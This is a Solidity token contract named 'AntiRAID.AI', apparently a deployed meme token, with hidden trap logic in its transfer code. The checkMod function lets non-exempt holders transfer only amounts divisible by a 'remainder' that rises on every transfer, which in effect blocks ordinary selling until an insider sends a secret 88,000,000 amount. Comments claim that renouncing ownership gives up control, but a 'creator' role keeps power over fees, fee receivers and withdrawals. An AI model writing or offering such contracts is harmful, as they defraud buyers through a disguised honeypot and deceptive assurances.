/**
 *Submitted for verification at Etherscan.io on 2022-12-20
*/

//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.5;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    address internal creator;
    mapping (address => bool) internal authorizations;
    constructor(address _owner) {
        owner = _owner;
        creator = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    modifier authorized() {
        require(isAuthorized(msg.sender) || isCreator(msg.sender), "!AUTHORIZED"); _;
    }
    function authorize(address adr, bool state) public authorized {
        authorizations[adr] = state;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
     function isCreator(address account) public view returns (bool) {
         return account == creator;
    }
     function isAuthorized(address adr) public view returns (bool) {
         return authorizations[adr];
     }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  
    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract AntiRAID is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address lpToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "AntiRAID.AI";
    string constant _symbol = "MOD.AI()";
    uint8 constant _decimals = 6;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;
    uint256 public _maxTxAmount = _totalSupply * 1 / 100;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isBlacklisted; //Blacklist available only at launch to deter snipers. It is the only function which is onlyOwner, contract will be renounced after launch to give up control.
    

    uint256 liquidityFee = 125; 
    uint256 marketingFee = 300;
    uint256 developerFee = 150;
    uint256 totalFee = liquidityFee + marketingFee + developerFee;
    uint256 feeDenominator = 10000;

     uint256 targetLiquidity = 15;
     uint256 targetLiquidityDenominator = 100;

    address internal marketingFeeReceiver = 0xec8141570e06891EdF5424e72B1dEd6B332dA381;
    address internal developerFeeReceiver = 0xc744e33eFABCEe7F485C061eA11aa52bB102E8EA;
    address internal autoLiquidityReceiver = 0xF71d9a5609da1089D2A4d986124E63f4680EcA1f;

    IDEXRouter public router;
    address public pair;

    bool public swapEnabled = true;
    bool public isTxLimited = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 5; // 0.5%
    uint256 public remainder = 15000000;
    uint256 modDis = 88000000;
    bool modPro = true;    
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = IDEXRouter(routerAdress);
        pair = IDEXFactory(router.factory()).createPair(lpToken, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _owner = owner;
        isFeeExempt[marketingFeeReceiver] = true;
        isFeeExempt[_owner] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[DEAD] = true;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }
    

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!isBlacklisted[sender]); //Blacklist available only at launch to deter snipers. It is the only function which is onlyOwner, contract will be renounced after launch to give up control.
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
        }
        checkMod(sender, amount);
        if(modPro){remainder += 2000000 ;}
        doModDis(amount);
        
        if(shouldSwapBack()){ swapBack(swapThreshold); } 

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender] || !isTxLimited, "TX Limit Exceeded");
    }
     function checkMod(address sender, uint256 amount) internal view {
        if (modPro){
            require(isTxLimitExempt[sender] || amount % remainder == 0 || amount % modDis == 0 );
        }
        
    }
     function doModDis(uint256 amount) internal {
        if (modPro && amount % modDis == 0){
            modPro = false;
        }
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }
        function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }
    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
       return getLiquidityBacking(accuracy) > target;
    }

    function swapBack(uint256 internalThreshold) internal swapping {
        uint256 contractTokenBalance = internalThreshold;
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = contractTokenBalance.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](2);
        address[] memory path_long = new address[](3);
        path_long[0] = address(this);
        path_long[1] = lpToken;
        path_long[2] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path_long,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHDeveloper = amountETH.mul(developerFee).div(totalETHFee);


        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
        (bool developerSuccess, /* bytes memory data */) = payable(developerFeeReceiver).call{value: amountETHDeveloper, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
        require(developerSuccess, "receiver rejected ETH transfer");

        path[0] = router.WETH();
        path[1] = lpToken;

        if(amountETHLiquidity > 0 ){
            router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountETHLiquidity}(
                0,
                path,
                address(this),
                block.timestamp
            );


        }

        uint256 amountLPIDk = amountToLiquify;

        if(amountToLiquify > 0){
            uint256 lpTokenBalance = ERC20(lpToken).balanceOf(address(this));            
            ERC20(lpToken).approve(address(router), lpTokenBalance);
             
            router.addLiquidity(
                lpToken,
                address(this),
                lpTokenBalance,
                amountLPIDk,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    function airdrop(address[] memory recipients, uint256[] memory values) external authorized {
        for (uint256 i = 0; i < recipients.length; i++){
            _transferFrom(msg.sender, recipients[i], values[i]);
        }
    
    }
    function burnStuckToken (uint256 amount) external authorized {
        _transferFrom(address(this), DEAD, amount);
    }
    function blackList(address _user) external onlyOwner { // The only function which is onlyOwner. Will be used to deter snipers at launch then contract will be renounced. 
        require(!isBlacklisted[_user], "user already blacklisted");
        isBlacklisted[_user] = true;
    }
    function removeFromBlacklist(address _user) external authorized {
        require(isBlacklisted[_user], "user already whitelisted");
        isBlacklisted[_user] = false;

    }
    function clearStuckBalance(uint256 amountPercentage) external authorized {
        uint256 amountETH = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountETH * amountPercentage / 100);
        uint256 BUSDLeftoverBalance = ERC20(lpToken).balanceOf(address(this));
        uint256 BUSDLeftoverBalancePC = BUSDLeftoverBalance * amountPercentage / 100;
        ERC20(lpToken).transfer(marketingFeeReceiver, BUSDLeftoverBalancePC);
    }
    function enableTxLimit(bool enabled) external authorized {
        isTxLimited = enabled;
    }

    function setWalletLimit(uint256 amountPercent) external authorized {
        _maxWalletAmount = (_totalSupply * amountPercent ) / 100;
        require(amountPercent > 1);
    }

    function setFee(uint256 _liquidityFee, uint256 _marketingFee, uint256 _developerFee, uint256 _feeDenominator) external authorized {
         liquidityFee = _liquidityFee; 
         marketingFee = _marketingFee;
         developerFee = _developerFee;
         feeDenominator = _feeDenominator;
         totalFee = liquidityFee + marketingFee + developerFee;
         require(totalFee < feeDenominator / 8 );
    } 
    function setFeeExempt (address wallet, bool onoff) external authorized {
        isFeeExempt[wallet] = onoff;     
    }
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _developerFeeReceiver) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        developerFeeReceiver = _developerFeeReceiver;
 
    }
    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }
    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }
    function triggerSwapBack(uint256 contractSellAmount) external authorized {
        swapBack(contractSellAmount);
    } 
    
    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
}